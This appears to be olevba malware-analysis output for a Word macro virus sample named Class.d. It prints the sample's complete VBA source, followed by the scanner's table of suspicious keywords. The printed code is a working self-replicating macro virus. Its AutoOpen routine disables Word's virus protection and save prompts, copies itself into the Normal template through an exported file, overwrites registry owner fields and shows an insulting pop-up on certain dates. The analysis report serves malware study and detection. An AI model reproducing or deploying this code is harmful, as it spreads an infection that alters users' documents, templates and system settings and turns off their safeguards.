olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-1275bb798aafb6401e673681829deadcee8a7138
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-1275bb798aafb6401e673681829deadcee8a7138 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Const REG_SZ As Long = 1
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Const HKEY_CURRENT_USER As Long = &H80000001
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Sub AutoOpen()
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
On Error GoTo out
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Options.VirusProtection = False
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Options.SaveNormalPrompt = False
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Options.ConfirmConversions = False
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
If nt > 70 And ad > 0 Then GoTo out
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
If nt < 70 Then
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
End If
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
host.codemodule.AddFromFile ("c:\class.sys")
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
With host.codemodule
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    For x = 1 To 16
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    .deletelines 1
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    Next x
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
End With
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
If nt < 70 Then
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    With host.codemodule
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    .replaceline 1, "Sub AutoClose()"
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    .replaceline 91, "Sub ToolsMacro()"
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    For x = 70 To 81
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
        .deletelines 62
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    Next x
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    .replaceline 35, "    For x = 1 To 4"
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    End With
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
End If
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
If nt < 70 Then
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
u = RegCloseKey(k)
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
End If
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
With host.codemodule
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    For x = 2 To 104 Step 2
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
    Next x
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
End With
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
out:
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
End Sub
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
Sub ViewVBCode()
'Tzvetan Chaliavski1/7/99 10:57:33 AMUK138.DOC
End Sub

Private Sub CheckBox1_Click()

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |CheckBox1_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
